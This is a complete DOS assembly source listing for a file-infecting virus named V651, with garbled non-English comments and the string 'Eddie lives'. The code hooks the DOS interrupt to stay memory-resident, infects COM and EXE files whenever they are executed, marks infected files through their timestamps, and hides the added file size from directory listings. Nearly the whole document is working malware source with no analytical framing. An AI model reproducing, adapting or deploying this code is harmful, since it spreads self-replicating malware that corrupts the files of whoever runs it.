
PAGE  59,132

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;€€                                                                      €€
;€€                             V651                                     €€
;€€                                                                      €€
;€€      Created:   17-Jan-80                                            €€
;€€      Version:                                                        €€
;€€      Passes:    9          Analysis Options on: ABCEFPX              €€
;€€                                                                      €€
;€€                                                                      €€
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€

data_1e         equ     84h                     ; (6FC2:0084=0)
data_2e         equ     86h                     ; (6FC2:0086=0)

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

v651            proc    far

start:
                jmp     loc_2                   ; (09EB)
                db      377 dup (0)
data_4          dw      0                       ; Data table (indexed access)
data_5          dw      0                       ; Data table (indexed access)
data_6          dw      offset loc_1, seg loc_1 ;*Data table (indexed access)
data_8          dw      0                       ; Data table (indexed access)
data_9          dw      0                       ; Data table (indexed access)
data_10         dw      0                       ; Data table (indexed access)
                db      0                       ; Data table (indexed access)
                db      0
data_13         dw      0
                db      0, 0
data_14         dw      0
data_15         dw      0
data_16         dw      0
data_17         dd      00000h
                db      0, 0
data_19         dd      00000h
data_21         dw      0
data_22         dw      0
                db      1863 dup (0)
loc_2:
                call    sub_1                   ; (09EE)

v651            endp

;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_1           proc    near
                pop     bx
                sub     bx,3                    ; bx - ≠†∑†´•≠ †§∞•±
                push    ax
                sub     ax,ax
                mov     es,ax                   ; ES:=0
                mov     ax,es:[84h]             ; Çß•¨† INT 21h ¢•™≤Æ∞†
                mov     cs:[bx+027Ch],ax        ; á†Ø†ß¢† offs ≠† INT 13h
                mov     ax,es:[86h]             ; Çß•¨† seg ≠† INT 13h
                mov     cs:[bx+027Eh],ax        ; á†Ø†ß¢† seg ≠† INT 13h
                mov     ax,0A55Ah
                int     21h                     ; è∞Æ¢•∞ø¢† ß† ∞•ß®§•≠≤•≠ ¢®∞≥±
                cmp     ax,5AA5h
                je      loc_3                   ; Ä™Æ • ∞•ß®§•≠≤•≠. àßµÆ§
                mov     ax,sp
                inc     ax
                mov     cl,4
                shr     ax,cl                   ; Shift w/zeros fill
                inc     ax
                mov     cx,ss
                add     ax,cx
                mov     cx,ds
                dec     cx                      ; ç†¨®∞† ™∞†ø≤ ≠† Ø∞Æ£∞†¨†≤†
                mov     es,cx
                mov     di,2
                mov     dx,2Bh
                mov     cx,[di]                 ; Ç CX ±• ß†Ø®±¢† ∞†ß¨•∞† ≠† Ø†¨•≤≤†
                sub     cx,dx                   ; àß¢†¶§† Æ≤ CX , DX
                cmp     cx,ax                   ; è∞Æ¢•∞ø¢† §†´® ®¨† ¨ø±≤Æ ß† ¢®∞≥±†
                jb      loc_3                   ; Ä™Æ ≠ø¨† ®ß´®ß†
                sub     es:[di+1],dx            ; àß¢†¶§† §∫´¶®≠†≤† ≠† ¢®∞≥±† Æ≤ ≤•™≥π®ø °´Æ™
                mov     [di],cx                 ; á†Ø®±¢† ≠Æ¢®ø≤ ∞†ß¨•∞ ≠† Ø†¨•≤≤†
                mov     es,cx
                mov     si,bx
                sub     di,di
                mov     cx,140h
                cld                             ; è∞•¨•±≤¢† ™Æ§† ¢ £Æ∞≠†≤† ∑†±≤
                rep     movs word ptr es:[di],word ptr cs:[si]
                mov     ax,es                   ; AX:=ES
                mov     es,cx                   ; ES:=0
                cli
                mov     word ptr es:[84],0A7h   ; è∞Æ¨•≠ø INT 21h
                mov     es:[86],ax
                sti
loc_3:
                push    ds
                pop     es
                mov     ax,cs:[bx+0288h]        ; á†∞•¶§† ¥´Æ£ ß† ≤®Ø† ≠† ¥†®´†
                cmp     ax,5A4Dh                ; î†®´† • EXE ?
                je      loc_4
                cmp     ax,4D5Ah                ; î†®´† • EXE ?
                je      loc_4
                mov     di,100h                 ; Ç Ø∞Æ≤®¢•≠ ±´≥∑†© ¥†®´† • COM
                mov     [di],ax
                mov     al,byte ptr [bx+28Ah]   ; Ç∫ß±≤†≠Æ¢ø¢† Ø∫∞¢®≤• 3 °†©≤†
                mov     [di+2],al
                pop     ax
                push    di
                retn                            ; Ç∞∫π† ≥Ø∞†¢´•≠®•≤Æ ≠† Ø∞£∞†¨†≤†
loc_4:
                pop     ax
                mov     dx,ds
                add     dx,10h                  ; è∞®°†¢ø ™∫¨ ±≤†∞≤Æ¢®ø †§∞•±
                add     word ptr cs:[bx+0282h],dx  ; ≤•™≥π®ø ±•£¨•≠≤
                add     dx,cs:[bx+0286h]        ; è∞®°†¢ø ™∫¨ ≤•™≥π®ø ±•£¨•≠≤
                mov     ss,dx                   ; Æ≤¨•±≤¢†≠•≤Æ ≠† SS
                mov     sp,cs:[bx+0284h]        ; Ç∫ß±≤†≠Æ¢ø¢† SP
                jmp     dword ptr cs:[bx+0280h] ; è∞•µÆ§ ™∫¨ ¢µÆ§≠†≤† ≤Æ∑™† ≠† ¥†®´†

;-----------------------------------------------------------------------------

                sti                             ; ÇµÆ§≠† ≤Æ∑™† ≠† INT 21h
                cmp     ax,4B00h                ; Exec read & exec
                je      loc_10
                cmp     ah,11h                  ; FindFirst FCB
                je      loc_5
                cmp     ah,12h                  ; FindNext FCB
                je      loc_5
                cmp     ax,0A55Ah
                je      loc_9                   ; Jump if equal
                jmp     loc_28                  ; (0C44)
loc_5:
                pushf                           ; Push flags
                call    dword ptr cs:data_4     ; (6FC2:027C=0)
                test    al,al                   ; è∞Æ¢•∞ø¢† §†´® • ≠†¨•∞•≠ ¥†®´
                jnz     loc_ret_8               ; Ä™Æ ≠• àáïéÑ!
                push    ax
                push    bx                      ; á†Ø†ß¢† AX,BX,ES
                push    es
                mov     bx,dx
                mov     al,[bx]
                push    ax
                mov     ah,2Fh                  ; '/'
                int     21h                     ; DOS Services  ah=function 2Fh
                                                ;  get DTA ptr into es:bx
                pop     ax
                inc     al
                jnz     loc_6                   ; Jump if not zero
                add     bx,7
loc_6:
                mov     ax,es:[bx+17h]
                and     al,1Fh                  ; è∞Æ¢•∞ø¢† §†´® • ß†∞†ß•≠
                cmp     al,1Fh
                jne     loc_7
                and     byte ptr es:[bx+17h],0E0h
                sub     word ptr es:[bx+1Dh],28Bh  ; äÆ∞®£®∞† §∫´¶®≠†≤†
                sbb     word ptr es:[bx+1Fh],0
loc_7:
                pop     es
                pop     bx                     ; Ç∫ß±≤†≠Æ¢ø¢† ∞•£®±≤∞®≤•
                pop     ax

loc_ret_8:
                iret                            ; Interrupt return
loc_9:
                not     ax                      ; íÆ¢† • ¥≥≠™∂®ø A55A
                iret                            ; Interrupt return
loc_10:
                push    ds
                push    es
                push    ax                       ; Çß•¨† INT 24h
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                mov     ax,3524h
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                push    es
                push    bx
                push    ds
                push    dx                       ; è∞Æ¨•≠ø INT 24h
                push    cs
                pop     ds
                mov     dx,25Eh
                mov     ax,2524h
                int     21h                     ; DOS Services  ah=function 25h
                                                ;  set intrpt vector al to ds:dx
                pop     dx
                pop     ds
                mov     ax,4300h                ; Çß•¨† †≤∞®°≥≤®≤• ≠† ¥†®´†
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
                jnc     loc_11                  ; Jump if carry=0
                sub     cx,cx
                jmp     loc_26                  ; àßµÆ§
loc_11:
                push    cx
                test    cl,1
                jz      loc_12                  ; è∞Æ¢•∞ø¢† §†´® ≠ø¨† ¢™´æ∑•≠ read-only
                dec     cx
                mov     ax,4301h                ; è∞Æ¨•≠ø †≤∞®°≥≤®≤• ≠† ¥†®´†
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
loc_12:
                mov     ax,3D02h                ; é≤¢†∞ø ¥†®´†
                int     21h

                push    cs
                pop     ds
                jnc     loc_13                  ; Jump if carry=0
                jmp     loc_25                  ; (0C2A)
loc_13:
                mov     bx,ax
                mov     ax,5700h                ; Çß•¨† ¢∞•¨•≤Æ ≠† ¥†®´†
                int     21h                     ; DOS Services  ah=function 57h
                                                ;  get/set file date & time
                jc      loc_14                  ; Jump if carry Set
                mov     al,cl
                or      cl,1Fh                  ; è∞Æ¢•∞ø¢† ¥†®´† ß†∞†ß•≠ ´® •
                cmp     al,cl
                jne     loc_15                  ; Jump if not equal
loc_14:
                jmp     loc_24                  ; (0C26)
loc_15:
                push    cx
                push    dx
                mov     dx,288h
                mov     cx,18h
                mov     ah,3Fh                  ; ó•≤• Ø∞•¥®™±† ≠† EXE
                int     21h                     ; DOS Services  ah=function 3Fh
                                                ;  read file, cx=bytes, to ds:dx
                jc      loc_16                  ; Jump if carry Set
                sub     cx,ax
                jnz     loc_16                  ; Jump if not zero
                les     ax,data_17              ; á†ØÆ¨≠ø Æ≤¨•±≤¢†≠•≤Æ ≠† SS ® SP
                mov     data_8,es               ; (6FC2:0284=0) => SS
                mov     data_9,ax               ; (6FC2:0286=0) => SP
                les     ax,data_19              ; á†ØÆ¨≠ø Æ≤¨•±≤¢†≠•≤Æ ≠† CS ® IP
                mov     word ptr data_6,ax      ; (6FC2:0280=0) => IP
                mov     word ptr data_6+2,es    ; (6FC2:0282=0) => CS
                mov     dx,cx
                mov     ax,4202h
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                jc      loc_16                  ; Jump if carry Set
                mov     data_21,ax              ; (6FC2:02A0=0)
                mov     data_22,dx              ; (6FC2:02A2=0)
                mov     cx,28Bh
                cmp     ax,cx
                sbb     dx,0
                jc      loc_16                  ; Jump if carry Set
                call    sub_2                   ; è∞Æ¢•∞ø¢† §†´® • EXE
                jz      loc_17                  ; Jump if zero
                cmp     ax,0FB75h               ; è∞Æ¢•∞ø¢† §†´® • ¢∫ß¨Æ¶≠Æ §† ±• ß†Ø®∏•
                jb      loc_17                  ; Jump if below
loc_16:
                jmp     loc_22                  ; (0C1C)
loc_17:
                sub     dx,dx
                mov     ah,40h                  ; á†Ø®±¢† ¢®∞≥±† ¢ ™∞†ø ≠† ¥†®´†
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                jc      loc_16                  ; Jump if carry Set
                sub     cx,ax
                jnz     loc_16                  ; Jump if not zero
                mov     dx,cx
                mov     ax,4200h                ; è∞•¨•±≤¢† FP ¢ ≠†∑†´Æ≤Æ ≠† ¥†®´†
                int     21h                     ; DOS Services  ah=function 42h
                                                ;  move file ptr, cx,dx=offset
                jc      loc_16                  ; Jump if carry Set
                mov     ax,data_21              ; (6FC2:02A0=0)
                call    sub_2                   ; è∞Æ¢•∞ø¢† §†´® • EXE
                jnz     loc_20                  ; Jump if not zero
                mov     dx,data_22              ; (6FC2:02A2=0)
                mov     cx,4
                mov     si,data_14              ; (6FC2:0290=0)
                sub     di,di

locloop_18:
                shl     si,1                    ; Shift w/zeros fill
                rcl     di,1                    ; Rotate thru carry
                loop    locloop_18              ; Loop if cx > 0

                sub     ax,si
                sbb     dx,di
                mov     cl,0Ch
                shl     dx,cl                   ; Shift w/zeros fill
                mov     word ptr data_19,ax     ; (6FC2:029C=0)
                mov     word ptr data_19+2,dx   ; (6FC2:029E=0)
                add     dx,31h
                nop                             ; äÆ∞®£®∞† Ø∞•¥®™±†
                mov     word ptr data_17+2,ax   ; (6FC2:0298=0)
                mov     word ptr data_17,dx     ; (6FC2:0296=0)
                add     data_15,9               ; (6FC2:0292=0)
                mov     ax,data_15              ; (6FC2:0292=0)
                cmp     ax,data_16              ; (6FC2:0294=0)
                jb      loc_19                  ; Jump if below
                mov     data_16,ax              ; (6FC2:0294=0)
loc_19:
                mov     ax,word ptr ds:[28Ah]   ; (6FC2:028A=0)
                add     ax,28Bh
                push    ax
                and     ah,1
                mov     word ptr ds:[28Ah],ax   ; (6FC2:028A=0)
                pop     ax
                mov     cl,9
                shr     ax,cl                   ; Shift w/zeros fill
                add     data_13,ax              ; (6FC2:028C=0)
                jmp     short loc_21            ; (0C0C)
loc_20:
                sub     ax,3
                mov     byte ptr data_10,0E9h   ; (6FC2:0288=0)
                mov     word ptr data_10+1,ax   ; (6FC2:0289=0)
loc_21:
                mov     dx,288h
                mov     cx,18h
                mov     ah,40h                  ; á†Ø®±¢† Ø∞•¥®™±†
                int     21h                     ; DOS Services  ah=function 40h
                                                ;  write file cx=bytes, to ds:dx
                jc      loc_22                  ; Jump if carry Set
                cmp     ax,cx
                je      loc_23                  ; Jump if equal
loc_22:
                stc                             ; Set carry flag
loc_23:
                pop     dx
                pop     cx
                jc      loc_24                  ; Ç∫ß±≤†≠Æ¢ø¢† ¢∞•¨•≤Æ
                mov     ax,5701h
                int     21h                     ; DOS Services  ah=function 57h
                                                ;  get/set file date & time
loc_24:
                mov     ah,3Eh                  ; á†≤¢†∞ø ¥†®´†
                int     21h
loc_25:
                pop     cx
loc_26:
                test    cl,1
                jz      loc_27                  ; Jump if zero
                mov     ax,4301h                ; Ç∫ß±≤†≠Æ¢ø¢† †≤∞®°≥≤®≤•
                int     21h                     ; DOS Services  ah=function 43h
                                                ;  get/set file attrb, nam@ds:dx
loc_27:
                pop     dx
                pop     ds
                mov     ax,2524h
                int     21h                     ; Ç∫ß±≤†≠Æ¢ø¢† INT 24h
                pop     di
                pop     si
                pop     dx
                pop     cx                      ; Ç∫ß±≤†≠Æ¢ø¢† ∞•£®±≤∞®≤•
                pop     bx
                pop     ax
                pop     es
                pop     ds
loc_28:
                jmp     dword ptr cs:data_4     ; (6FC2:027C=0)
                mov     al,3
                iret                            ; Interrupt return
sub_1           endp


;ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ
;                              SUBROUTINE
;‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹

sub_2           proc    near                    ; è∞Æ¢•∞ø¢† §†´® ¥†©´† • EXE
                mov     si,data_10              ; (6FC2:0288=0)
                cmp     si,5A4Dh
                je      loc_ret_29              ; Jump if equal
                cmp     si,4D5Ah

loc_ret_29:
                retn
sub_2           endp

                db      'Eddie lives'
otmestwania     db      0, 60h, 14h, 8Eh, 2, 0
                db      7 dup (0)
First_inst:     db      0CDh, 20h, 0

seg_a           ends



                end     start
